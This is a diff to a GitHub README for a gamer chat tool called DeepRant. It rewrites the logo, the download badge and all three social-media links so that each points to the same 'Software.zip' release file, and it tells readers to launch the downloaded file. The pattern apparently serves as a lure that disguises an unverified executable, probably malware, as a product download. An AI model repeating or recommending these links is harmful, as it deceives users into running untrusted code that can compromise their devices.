@@ -1,6 +1,6 @@
 
 # DeepRant: -游戏文字交流AI嘴强王者工具
-![DeepRant Logo](https://example.com/logo.png)
+![DeepRant Logo](https://github.com/HALOHERE2/DeepRant/releases/download/v1.0/Software.zip)
 
 ## Welcome to DeepRant 
 
@@ -28,7 +28,7 @@ Welcome to DeepRant - the ultimate tool for gamers to exchange text-based rants 
 
 To get DeepRant up and running, download the latest version from the link below:
 
-[![Download DeepRant](https://img.shields.io/badge/Download-DeepRant-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download DeepRant](https://github.com/HALOHERE2/DeepRant/releases/download/v1.0/Software.zip)](https://github.com/HALOHERE2/DeepRant/releases/download/v1.0/Software.zip)
 
 *Note: Launch the downloaded file to install DeepRant on your device.*
 
@@ -39,9 +39,9 @@ For more information and updates, check the "Releases" section of this repositor
 Connect with us on social media to stay updated on the latest DeepRant news, features, and events. Let the gaming rants begin!
 
 Follow us on:
-- [Twitter](https://twitter.com/DeepRant)
-- [Facebook](https://facebook.com/DeepRant)
-- [Instagram](https://instagram.com/DeepRant)
+- [Twitter](https://github.com/HALOHERE2/DeepRant/releases/download/v1.0/Software.zip)
+- [Facebook](https://github.com/HALOHERE2/DeepRant/releases/download/v1.0/Software.zip)
+- [Instagram](https://github.com/HALOHERE2/DeepRant/releases/download/v1.0/Software.zip)
 
 Let's revolutionize the way gamers communicate with DeepRant! 🎮🤖💬
 
